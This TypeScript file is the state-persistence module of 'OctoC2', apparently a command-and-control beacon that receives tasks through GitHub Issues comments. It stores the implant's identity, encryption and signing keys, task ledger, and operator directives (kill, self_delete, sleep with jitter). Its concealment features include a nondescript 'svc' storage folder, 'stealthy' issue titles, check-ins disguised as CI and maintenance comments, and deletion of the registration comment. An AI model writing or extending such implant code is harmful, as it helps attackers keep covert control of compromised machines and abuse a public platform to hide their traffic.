/**
 * OctoC2 — BeaconState
 *
 * Persistent state for a beacon instance. Survives process restarts.
 * Stores the stable beacon identity, key pair, and per-tentacle bookmarks.
 *
 * Location resolution order:
 *   Linux/macOS : $XDG_CONFIG_HOME/svc/{beaconId}.json
 *                 (falls back to ~/.config/svc/{beaconId}.json)
 *   Windows     : %APPDATA%\svc\{beaconId}.json
 *   Fallback    : ./svc-state.json  (containers, restricted envs)
 *
 * Writes are atomic: write to {path}.tmp then rename, preventing
 * corruption on crash or power loss.
 *
 * Phase 2: plaintext JSON, chmod 0600.
 * Phase 5: AES-256-GCM with machine-derived key (HKDF from machineId).
 */

import { dirname, join } from "node:path";
import { createHash } from "node:crypto";
import { mkdir, readFile, writeFile, rename, chmod, copyFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { canonicalJson, type TaskResult } from "@octoc2/shared";
import type { ExecutorDirective } from "../tasks/TaskDirective.ts";
import {
  assertBeaconId,
  defaultBeaconStateDirectory,
} from "./BeaconIdentity.ts";
import {
  SeenTaskFilter,
  type SeenTaskFilterData,
} from "./SeenTaskFilter.ts";
import { validateBeaconStateV2 } from "./BeaconStateValidation.ts";

export interface SigningKeyPairData {
  publicKey: string;
  secretKey: string;
  keyId: string;
}

export interface RuntimeSleepOverride {
  seconds: number;
  jitter: number;
}

export interface TaskLedgerEntry {
  taskId: string;
  status: "started" | "completed";
  startedAt: string;
  result: TaskResult | null;
  directive: ExecutorDirective;
  resultSubmittedAt: string | null;
  directiveAppliedAt: string | null;
}

export interface BeaconStateData {
  version: 2;
  beaconId: string;
  /** Issues tentacle: persistent issue number (null until discovered/created) */
  issueNumber: number | null;
  /** Issues tentacle: monotonic sequence counter for replay protection */
  seq: number;
  /**
   * Issues tentacle: highest task comment ID processed.
   * Used as lower bound for next poll to avoid re-processing old comments.
   */
  lastTaskCommentId: number | null;
  /** Issues tentacle: whether the server has ACKed the registration comment */
  registrationStatus: "pending" | "registered";
  /**
   * Issues tentacle: GitHub comment ID of the persistent CI heartbeat comment.
   * Subsequent checkins PATCH this comment in-place to avoid issue spam.
   * Null until the first post-registration checkin.
   */
  ciCommentId: number | null;
  /**
   * Issues tentacle: GitHub comment ID of the persistent maintenance session block.
   * Null until first upsertMaintenanceComment() call.
   */
  maintenanceCommentId: number | null;
  /**
   * Issues tentacle: UUID used as the hidden HTML marker for the maintenance comment.
   * Stays stable across updates so the comment can be found/updated by ID.
   * Null until first upsertMaintenanceComment() call.
   */
  maintenanceSessionId: string | null;
  /**
   * Issues tentacle: ISO-8601 timestamp when the maintenance session was opened.
   * Set once when maintenanceSessionId is first generated.
   */
  maintenanceSessionOpenedAt: string | null;
  /**
   * Issues tentacle: epoch-ms when the maintenance comment was last updated.
   * Used for rate-limiting (max once per 30–60 s). Defaults to 0.
   */
  lastMaintenanceUpdateMs: number;
  /**
   * Issues tentacle: true after the first maintenance comment is successfully
   * created. Persists across restarts so checkin() skips the CI heartbeat
   * even on the very first checkin after a restart.
   */
  initialMaintenancePosted: boolean;
  /**
   * Issues tentacle: GitHub comment ID of the one-time registration comment.
   * Saved so the comment can be deleted after the server ACK is processed.
   * Null once the comment has been deleted (or if it was never posted).
   */
  regCommentId: number | null;
  /**
   * Issues tentacle: the title used when creating this beacon's GitHub issue.
   * Set once in discoverOrCreateIssue() (either from OCTOC2_ISSUE_TITLE env var
   * or generated from the stealthy default format).
   * Null until the issue has been discovered or created.
   */
  issueTitle: string | null;
  /** Beacon X25519 key pair — stable across restarts, registered with server */
  keyPair: {
    publicKey: string; // base64url
    secretKey: string; // base64url — sensitive, see Phase 5 note above
  };
  signingKeyPair: SigningKeyPairData;
  identitySeq: number;
  sleepOverride: RuntimeSleepOverride | null;
  terminationRequested: boolean;
  taskLedger: TaskLedgerEntry[];
  seenTaskFilter: SeenTaskFilterData;
}

type LegacyBeaconStateData = Omit<
  BeaconStateData,
  | "version"
  | "signingKeyPair"
  | "identitySeq"
  | "sleepOverride"
  | "terminationRequested"
  | "taskLedger"
  | "seenTaskFilter"
> & {
  version: 1;
};

export interface StateMigrationOptions {
  signingKeyPair: SigningKeyPairData;
}

export interface StateStorageOptions {
  scope?: string;
  issueNumber?: number | null;
}

const MAX_TASK_LEDGER_ENTRIES = 256;

export class BeaconState {
  private data: BeaconStateData;
  private readonly seenTaskFilter: SeenTaskFilter;
  readonly filePath: string;

  constructor(
    data: BeaconStateData,
    filePath: string,
    seenTaskFilter = SeenTaskFilter.fromJSON(data.seenTaskFilter),
  ) {
    this.seenTaskFilter = seenTaskFilter;
    this.data = {
      ...data,
      keyPair: { ...data.keyPair },
      signingKeyPair: { ...data.signingKeyPair },
      sleepOverride: data.sleepOverride
        ? { ...data.sleepOverride }
        : null,
      terminationRequested: data.terminationRequested ?? false,
      taskLedger: data.taskLedger.map((entry) => ({
        ...entry,
        result: entry.result === null ? null : structuredClone(entry.result),
        directive: cloneDirective(entry.directive),
        resultSubmittedAt: entry.resultSubmittedAt ?? null,
        directiveAppliedAt: entry.directiveAppliedAt ?? null,
      })),
      seenTaskFilter: this.seenTaskFilter.toJSON(),
    };
    this.filePath = filePath;
  }

  get beaconId():           string                    { return this.data.beaconId; }
  get issueNumber():        number | null              { return this.data.issueNumber; }
  get seq():                number                    { return this.data.seq; }
  get lastTaskCommentId():  number | null              { return this.data.lastTaskCommentId; }
  get registrationStatus(): "pending" | "registered"  { return this.data.registrationStatus; }
  get ciCommentId():        number | null              { return this.data.ciCommentId ?? null; }
  get keyPair():            BeaconStateData["keyPair"] { return { ...this.data.keyPair }; }
  get signingKeyPair():     SigningKeyPairData          { return { ...this.data.signingKeyPair }; }
  get identitySeq():        number                      { return this.data.identitySeq; }
  get sleepOverride():      RuntimeSleepOverride | null {
    return this.data.sleepOverride ? { ...this.data.sleepOverride } : null;
  }
  get terminationRequested(): boolean {
    return this.data.terminationRequested;
  }

  set issueNumber(v: number | null)                  { this.data.issueNumber = v; }
  set lastTaskCommentId(v: number | null)            { this.data.lastTaskCommentId = v; }
  set registrationStatus(v: "pending" | "registered") { this.data.registrationStatus = v; }
  set ciCommentId(v: number | null)                  { this.data.ciCommentId = v; }

  get maintenanceCommentId():       number | null { return this.data.maintenanceCommentId    ?? null; }
  get maintenanceSessionId():       string | null { return this.data.maintenanceSessionId    ?? null; }
  get maintenanceSessionOpenedAt(): string | null { return this.data.maintenanceSessionOpenedAt ?? null; }
  get lastMaintenanceUpdateMs():    number        { return this.data.lastMaintenanceUpdateMs  ?? 0; }

  set maintenanceCommentId(v: number | null)       { this.data.maintenanceCommentId    = v; }
  set maintenanceSessionId(v: string | null)       { this.data.maintenanceSessionId    = v; }
  set maintenanceSessionOpenedAt(v: string | null) { this.data.maintenanceSessionOpenedAt = v; }
  set lastMaintenanceUpdateMs(v: number)           { this.data.lastMaintenanceUpdateMs  = v; }

  get initialMaintenancePosted(): boolean      { return this.data.initialMaintenancePosted ?? false; }
  get regCommentId():             number | null { return this.data.regCommentId ?? null; }

  set initialMaintenancePosted(v: boolean)      { this.data.initialMaintenancePosted = v; }
  set regCommentId(v: number | null)            { this.data.regCommentId = v; }

  get issueTitle(): string | null { return this.data.issueTitle ?? null; }
  set issueTitle(v: string | null) { this.data.issueTitle = v; }

  /** Increment and return the next sequence number. Call before every comment post. */
  nextSeq(): number {
    this.data.seq += 1;
    return this.data.seq;
  }

  /** Increment the persistent sequence used by signed identity envelopes. */
  nextIdentitySeq(): number {
    this.data.identitySeq += 1;
    return this.data.identitySeq;
  }

  /** Reset only Issues-transport bookmarks while preserving beacon identity. */
  resetIssuesState(issueNumber: number | null): void {
    this.data.issueNumber = issueNumber;
    this.data.seq = 0;
    this.data.lastTaskCommentId = null;
    this.data.registrationStatus = "pending";
    this.data.ciCommentId = null;
    this.data.maintenanceCommentId = null;
    this.data.maintenanceSessionId = null;
    this.data.maintenanceSessionOpenedAt = null;
    this.data.lastMaintenanceUpdateMs = 0;
    this.data.initialMaintenancePosted = false;
    this.data.regCommentId = null;
    this.data.issueTitle = null;
  }

  getTaskLedgerEntry(taskId: string): TaskLedgerEntry | undefined {
    const entry = this.data.taskLedger.find((candidate) => candidate.taskId === taskId);
    return entry
      ? {
          ...entry,
          result: entry.result === null ? null : structuredClone(entry.result),
          directive: cloneDirective(entry.directive),
        }
      : undefined;
  }

  hasSeenTask(taskId: string): boolean {
    return this.seenTaskFilter.has(taskId);
  }

  listPendingResults(): TaskResult[] {
    return this.data.taskLedger.flatMap((entry) =>
      entry.status === "completed" &&
        entry.result !== null &&
        entry.resultSubmittedAt === null
        ? [structuredClone(entry.result)]
        : []
    );
  }

  /**
   * Record a task before execution. Returns false for any redelivery, including
   * a task whose prior process crashed before producing a result.
   */
  beginTask(taskId: string, startedAt = new Date().toISOString()): boolean {
    requireTaskId(taskId);
    requireCanonicalTimestamp(startedAt, "startedAt");
    if (this.seenTaskFilter.has(taskId)) return false;
    if (this.data.taskLedger.some((entry) => entry.taskId === taskId)) {
      throw new Error(
        `Task ledger contains ${taskId} but the seen-task filter does not`,
      );
    }
    this.ensureTaskLedgerCapacity();
    this.seenTaskFilter.add(taskId);
    this.data.taskLedger.push({
      taskId,
      status: "started",
      startedAt,
      result: null,
      directive: { kind: "none" },
      resultSubmittedAt: null,
      directiveAppliedAt: null,
    });
    return true;
  }

  completeTask(
    result: TaskResult,
    directive: ExecutorDirective = { kind: "none" },
  ): void {
    requireTaskId(result.taskId);
    if (result.beaconId !== this.data.beaconId) {
      throw new Error(
        `Task ${result.taskId} result belongs to ${result.beaconId}, not ${this.data.beaconId}`,
      );
    }
    requireCanonicalTimestamp(result.completedAt, "result.completedAt");
    if (!result.signature?.trim()) {
      throw new Error(`Task ${result.taskId} result is not signed`);
    }
    const normalizedDirective = cloneDirective(directive);
    const existing = this.data.taskLedger.find(
      (entry) => entry.taskId === result.taskId,
    );
    if (existing) {
      if (!this.seenTaskFilter.has(result.taskId)) {
        throw new Error(
          `Task ledger contains ${result.taskId} but the seen-task filter does not`,
        );
      }
      if (existing.status === "completed") {
        if (
          existing.result !== null &&
          canonicalJson(existing.result) === canonicalJson(result) &&
          canonicalJson(existing.directive) ===
            canonicalJson(normalizedDirective)
        ) {
          return;
        }
        throw new Error(
          `Task ${result.taskId} already has a conflicting completed result`,
        );
      }
      existing.status = "completed";
      existing.result = structuredClone(result);
      existing.directive = normalizedDirective;
      existing.resultSubmittedAt = null;
      existing.directiveAppliedAt = null;
    } else {
      if (this.seenTaskFilter.has(result.taskId)) {
        throw new Error(
          `Task ${result.taskId} was seen previously but its detailed ledger entry is unavailable`,
        );
      }
      this.ensureTaskLedgerCapacity();
      this.seenTaskFilter.add(result.taskId);
      this.data.taskLedger.push({
        taskId: result.taskId,
        status: "completed",
        startedAt: result.completedAt,
        result: structuredClone(result),
        directive: normalizedDirective,
        resultSubmittedAt: null,
        directiveAppliedAt: null,
      });
    }
  }

  async persistResultSubmitted(
    taskId: string,
    submittedAt = new Date().toISOString(),
  ): Promise<void> {
    requireCanonicalTimestamp(submittedAt, "resultSubmittedAt");
    const entry = this.requireCompletedTask(taskId);
    if (entry.resultSubmittedAt !== null) return;
    entry.resultSubmittedAt = submittedAt;
    try {
      await this.persist();
    } catch (error) {
      entry.resultSubmittedAt = null;
      throw error;
    }
  }

  getPendingDirective(taskId: string): ExecutorDirective {
    const entry = this.requireCompletedTask(taskId);
    if (entry.resultSubmittedAt === null) return { kind: "none" };
    if (entry.directiveAppliedAt !== null) return { kind: "none" };
    return cloneDirective(entry.directive);
  }

  listPendingAcknowledgedDirectives(): Array<{
    taskId: string;
    directive: ExecutorDirective;
  }> {
    return this.data.taskLedger.flatMap((entry) => {
      if (
        entry.status !== "completed" ||
        entry.result === null ||
        entry.resultSubmittedAt === null ||
        entry.directiveAppliedAt !== null ||
        entry.directive.kind === "none"
      ) {
        return [];
      }
      return [{
        taskId: entry.taskId,
        directive: cloneDirective(entry.directive),
      }];
    });
  }

  async persistDirectiveEffect(
    taskId: string,
    appliedAt = new Date().toISOString(),
  ): Promise<void> {
    requireCanonicalTimestamp(appliedAt, "directiveAppliedAt");
    const entry = this.requireCompletedTask(taskId);
    if (entry.resultSubmittedAt === null) {
      throw new Error(
        `Task ${taskId} cannot apply a directive before controller acceptance`,
      );
    }
    if (entry.directive.kind === "none") return;
    if (entry.directiveAppliedAt !== null) return;

    const previousSleepOverride = this.data.sleepOverride
      ? { ...this.data.sleepOverride }
      : null;
    const previousTerminationRequested = this.data.terminationRequested;
    entry.directiveAppliedAt = appliedAt;
    if (entry.directive.kind === "update_sleep") {
      this.data.sleepOverride = {
        seconds: entry.directive.seconds,
        jitter: entry.directive.jitter,
      };
    } else if (entry.directive.kind === "kill") {
      this.data.terminationRequested = true;
    }

    try {
      await this.persist();
    } catch (error) {
      entry.directiveAppliedAt = null;
      this.data.sleepOverride = previousSleepOverride;
      this.data.terminationRequested = previousTerminationRequested;
      throw error;
    }
  }

  /**
   * Atomically write the current state to disk.
   * Writes to a .tmp file first, then renames — safe on crash.
   */
  async persist(): Promise<void> {
    this.data.seenTaskFilter = this.seenTaskFilter.toJSON();
    const tmp = `${this.filePath}.tmp`;
    const json = JSON.stringify(this.data, null, 2);
    const parentDirectory = dirname(this.filePath);
    if (!existsSync(parentDirectory)) {
      try {
        await mkdir(parentDirectory, { recursive: true, mode: 0o700 });
      } catch (error) {
        if (!existsSync(parentDirectory)) throw error;
      }
    }
    await writeFile(tmp, json, {
      encoding: "utf8",
      mode: 0o600,
    });
    await chmod(tmp, 0o600).catch(() => {});
    await rename(tmp, this.filePath);
    // Best-effort: restrict file permissions. Silently ignored on Windows.
    await chmod(this.filePath, 0o600).catch(() => {});
  }

  toJSON(): BeaconStateData {
    this.data.seenTaskFilter = this.seenTaskFilter.toJSON();
    return structuredClone(this.data);
  }

  private ensureTaskLedgerCapacity(): void {
    while (this.data.taskLedger.length >= MAX_TASK_LEDGER_ENTRIES) {
      const removableIndex = this.data.taskLedger.findIndex((entry) =>
        entry.status === "completed" &&
        entry.result !== null &&
        entry.resultSubmittedAt !== null &&
        (
          entry.directive.kind === "none" ||
          entry.directiveAppliedAt !== null
        )
      );
      if (removableIndex < 0) {
        throw new Error(
          `Task ledger capacity ${MAX_TASK_LEDGER_ENTRIES} reached with no safely evictable entries`,
        );
      }
      this.data.taskLedger.splice(removableIndex, 1);
    }
  }

  private requireCompletedTask(taskId: string): TaskLedgerEntry {
    const entry = this.data.taskLedger.find(
      (candidate) => candidate.taskId === taskId,
    );
    if (!entry || entry.status !== "completed" || entry.result === null) {
      throw new Error(`Task ${taskId} has no completed ledger result`);
    }
    return entry;
  }
}

function cloneDirective(value: unknown): ExecutorDirective {
  if (
    typeof value !== "object" ||
    value === null ||
    Array.isArray(value)
  ) {
    throw new Error("Task directive must be an object");
  }
  const candidate = value as {
    kind?: unknown;
    seconds?: unknown;
    jitter?: unknown;
  };
  switch (candidate.kind) {
    case "none":
      requireExactFields(candidate, ["kind"], "none directive");
      return { kind: "none" };
    case "kill":
      requireExactFields(candidate, ["kind"], "kill directive");
      return { kind: "kill" };
    case "self_delete":
      requireExactFields(candidate, ["kind"], "self_delete directive");
      return { kind: "self_delete" };
    case "update_sleep":
      requireExactFields(
        candidate,
        ["jitter", "kind", "seconds"],
        "update_sleep directive",
      );
      if (
        typeof candidate.seconds === "number" &&
        Number.isSafeInteger(candidate.seconds) &&
        candidate.seconds >= 1 &&
        candidate.seconds <= 24 * 60 * 60 &&
        typeof candidate.jitter === "number" &&
        Number.isFinite(candidate.jitter) &&
        candidate.jitter >= 0 &&
        candidate.jitter <= 1
      ) {
        return {
          kind: "update_sleep",
          seconds: candidate.seconds,
          jitter: candidate.jitter,
        };
      }
      throw new Error("update_sleep directive is invalid");
    default:
      throw new Error("Task directive kind is invalid");
  }
}

const LEGACY_STATE_FIELDS = new Set([
  "version",
  "beaconId",
  "issueNumber",
  "seq",
  "lastTaskCommentId",
  "registrationStatus",
  "ciCommentId",
  "maintenanceCommentId",
  "maintenanceSessionId",
  "maintenanceSessionOpenedAt",
  "lastMaintenanceUpdateMs",
  "initialMaintenancePosted",
  "regCommentId",
  "issueTitle",
  "keyPair",
]);

function requireLegacyStateRecord(
  value: unknown,
  path: string,
): LegacyBeaconStateData {
  if (
    typeof value !== "object" ||
    value === null ||
    Array.isArray(value) ||
    Object.getPrototypeOf(value) !== Object.prototype
  ) {
    throw new Error(`Legacy beacon state at ${path} must be a plain object`);
  }
  const record = value as Record<string, unknown>;
  const unknown = Object.keys(record).filter(
    (field) => !LEGACY_STATE_FIELDS.has(field),
  );
  if (unknown.length > 0) {
    throw new Error(
      `Legacy beacon state at ${path} contains unknown fields: ${
        unknown.sort().join(", ")
      }`,
    );
  }
  if (record["version"] !== 1) {
    throw new Error(`Legacy beacon state at ${path} must have version 1`);
  }
  return record as unknown as LegacyBeaconStateData;
}

function requireExactFields(
  value: object,
  expectedFields: readonly string[],
  name: string,
): void {
  const actual = Object.keys(value).sort();
  const expected = [...expectedFields].sort();
  if (
    actual.length !== expected.length ||
    actual.some((field, index) => field !== expected[index])
  ) {
    throw new Error(
      `${name} fields must be exactly: ${expected.join(", ")}`,
    );
  }
}

function requireTaskId(taskId: string): void {
  if (
    typeof taskId !== "string" ||
    taskId.trim().length === 0 ||
    taskId.length > 1024
  ) {
    throw new Error("taskId must contain 1-1024 characters");
  }
}

function requireCanonicalTimestamp(value: string, name: string): void {
  if (
    typeof value !== "string" ||
    !Number.isFinite(Date.parse(value)) ||
    new Date(value).toISOString() !== value
  ) {
    throw new Error(`${name} must be a canonical ISO-8601 timestamp`);
  }
}

function errorMessage(error: unknown): string {
  return error instanceof Error ? error.message : String(error);
}

function stateFileName(beaconId: string, scope?: string): string {
  if (!scope) return `${beaconId}.json`;
  const digest = createHash("sha256")
    .update(scope, "utf8")
    .digest("hex")
    .slice(0, 24);
  return `${beaconId}.${digest}.json`;
}

function resolveStatePath(beaconId: string, scope?: string): string {
  return join(defaultBeaconStateDirectory(), stateFileName(beaconId, scope));
}

const FALLBACK_PATH = "./svc-state.json";

function fallbackStatePath(beaconId: string, scope?: string): string {
  if (!scope) return FALLBACK_PATH;
  const digest = createHash("sha256")
    .update(`${beaconId}\0${scope}`, "utf8")
    .digest("hex")
    .slice(0, 24);
  return `./svc-state.${digest}.json`;
}

/**
 * Load existing state for the given beacon ID.
 * Returns null if no state file exists (first run).
 * Tries the platform-standard path, then the fallback path.
 */
export class StateMigrationRequiredError extends Error {
  constructor(readonly statePath: string) {
    super(
      `State v1 at ${statePath} requires an explicitly provisioned Ed25519 signing identity`,
    );
    this.name = "StateMigrationRequiredError";
  }
}

export async function loadState(
  beaconId: string,
  migration?: StateMigrationOptions,
  scope?: string,
): Promise<BeaconState | null> {
  const normalizedBeaconId = assertBeaconId(beaconId);
  const candidates = [
    resolveStatePath(normalizedBeaconId, scope),
    fallbackStatePath(normalizedBeaconId, scope),
  ];
  const existing = candidates.filter((path) => existsSync(path));
  if (existing.length === 0) return null;
  if (existing.length > 1) {
    throw new Error(
      `Primary and fallback beacon state both exist for ${normalizedBeaconId}: ${
        existing.join(", ")
      }`,
    );
  }

  const path = existing[0]!;
  let parsed: unknown;
  try {
    parsed = JSON.parse(await readFile(path, "utf8"));
  } catch (error) {
    throw new Error(
      `Could not parse beacon state at ${path}: ${errorMessage(error)}`,
    );
  }
  if (
    typeof parsed !== "object" ||
    parsed === null ||
    Array.isArray(parsed)
  ) {
    throw new Error(`Beacon state at ${path} must be an object`);
  }
  const version = (parsed as Record<string, unknown>)["version"];
  if (version !== 1 && version !== 2) {
    throw new Error(
      `Beacon state at ${path} has unsupported version ${String(version)}`,
    );
  }

  if (version === 1) {
    if (!migration) throw new StateMigrationRequiredError(path);
    const legacy = requireLegacyStateRecord(parsed, path);
    const migratedCandidate = {
      ...legacy,
      version: 2,
      signingKeyPair: { ...migration.signingKeyPair },
      identitySeq: 0,
      sleepOverride: null,
      terminationRequested: false,
      taskLedger: [],
      seenTaskFilter: SeenTaskFilter.empty().toJSON(),
    };
    const validated = validateBeaconStateV2(
      migratedCandidate,
      normalizedBeaconId,
    );
    const backupPath = `${path}.v1.bak`;
    if (!existsSync(backupPath)) await copyFile(path, backupPath);
    const state = new BeaconState(
      validated.data,
      path,
      validated.seenTaskFilter,
    );
    await state.persist();
    return state;
  }

  const validated = validateBeaconStateV2(parsed, normalizedBeaconId);
  const state = new BeaconState(
    validated.data,
    path,
    validated.seenTaskFilter,
  );
  if (validated.filterMigrationRequired) await state.persist();
  return state;
}

/**
 * Create a fresh state file for a new beacon.
 * Tries the platform-standard directory first; falls back to current dir.
 *
 * @param beaconId  - stable UUID for this beacon (generated in index.ts on first run)
 * @param keyPair   - base64url-encoded X25519 public + secret key
 */
export async function createState(
  beaconId: string,
  keyPair: { publicKey: string; secretKey: string },
  signingKeyPair: SigningKeyPairData,
  options: StateStorageOptions = {},
): Promise<BeaconState> {
  const normalizedBeaconId = assertBeaconId(beaconId);
  const primaryPath = resolveStatePath(normalizedBeaconId, options.scope);
  const fallbackPath = fallbackStatePath(normalizedBeaconId, options.scope);
  if (existsSync(primaryPath) || existsSync(fallbackPath)) {
    throw new Error(
      `Refusing to overwrite existing beacon state for ${normalizedBeaconId}`,
    );
  }
  let filePath = primaryPath;

  // Ensure the parent directory exists; fall back to current dir on permission error
  try {
    await mkdir(dirname(primaryPath), { recursive: true, mode: 0o700 });
  } catch {
    filePath = fallbackPath;
  }

  const candidate = {
    version: 2,
    beaconId: normalizedBeaconId,
    issueNumber: options.issueNumber ?? null,
    seq: 0,
    lastTaskCommentId: null,
    registrationStatus: "pending",
    ciCommentId: null,
    maintenanceCommentId:       null,
    maintenanceSessionId:       null,
    maintenanceSessionOpenedAt: null,
    lastMaintenanceUpdateMs:    0,
    initialMaintenancePosted: false,
    regCommentId:             null,
    issueTitle:               null,
    keyPair,
    signingKeyPair: { ...signingKeyPair },
    identitySeq: 0,
    sleepOverride: null,
    terminationRequested: false,
    taskLedger: [],
    seenTaskFilter: SeenTaskFilter.empty().toJSON(),
  };

  const validated = validateBeaconStateV2(candidate, normalizedBeaconId);
  const state = new BeaconState(
    validated.data,
    filePath,
    validated.seenTaskFilter,
  );
  await state.persist();
  return state;
}
